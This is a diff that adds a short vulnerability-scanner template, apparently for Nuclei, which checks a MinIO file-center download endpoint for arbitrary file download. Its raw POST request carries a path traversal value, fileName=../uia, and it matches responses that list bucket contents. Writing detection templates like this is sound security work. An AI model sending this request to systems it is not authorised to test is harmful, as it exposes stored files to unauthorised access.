@@ -1,0 +1,20 @@
+id: minio-anyfiledownload
+
+info:
+  name: minio-anyfiledownload
+  author: minio
+  severity: high
+
+http:
+  - raw:
+    - | 
+      POST /file-center/minio/download HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 15
+
+      fileName=../uia
+    matchers:
+      - type: dsl
+        dsl:
+         - status_code==200 && contains_all(body,"<Contents>") && contains_all(body,"<Key>")
